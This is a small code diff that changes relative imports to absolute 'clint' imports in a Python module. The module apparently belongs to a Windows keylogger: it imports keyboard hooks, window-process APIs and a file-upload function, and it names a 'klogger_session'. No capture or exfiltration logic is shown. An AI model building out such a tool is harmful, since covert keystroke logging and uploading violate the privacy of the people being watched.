@@ -1,4 +1,4 @@
-from .drive import send_file
+from clint.drive import send_file
 from logger import log
 import atexit
 import time
@@ -12,8 +12,8 @@ import win32gui
 import win32process
 from pynput.keyboard import Key
 
-from .keyboard import BrowserHotKeys
-from .util import data_store
+from clint.keyboard import BrowserHotKeys
+from clint.util import data_store
 
 
 session="klogger_session"
